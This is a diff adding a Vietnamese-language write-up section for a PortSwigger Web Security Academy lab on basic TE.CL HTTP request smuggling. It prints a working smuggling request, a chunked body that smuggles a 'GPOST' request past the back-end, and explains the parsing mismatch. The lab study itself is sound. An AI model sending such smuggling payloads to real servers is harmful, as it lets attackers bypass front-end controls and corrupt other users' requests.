@@ -15,6 +15,24 @@ Do back-end server xác định điểm cuối của request bằng header `Tran
 Submit request trên hai lần, kết quả bài lab được giải.
 
 # 2. HTTP request smuggling, basic TE.CL vulnerability
+Bài lab có front-end sử dụng TE và backend sử dụng CL, như vậy ta có thể exploit với request sau:
+```
+POST / HTTP/1.1
+Host: 0a76006c036dbdfec4dac96100a90022.web-security-academy.net
+Transfer-Encoding: chunked
+Content-Length: 4
+
+5a
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x
+0
+
+
+```
+Front-end sử dụng TE nên sẽ lấy body request từ `5a` đến hết ký tự kết thúc `0`, còn back-end sử dụng CL `Content-Length: 4` nên sẽ xử lý body request chỉ có phần `5a`. Như vậy, từ `GPOST` trở đi sẽ được coi là request kế tiếp. Khi ta submit request hai lần, request đầu tiên sẽ là POST request với body `5a`, và request thứ hai sẽ là GPOST request. Như vậy, bài lab được giải thành công.
 
 # 3. HTTP request smuggling, obfuscating the TE header
 
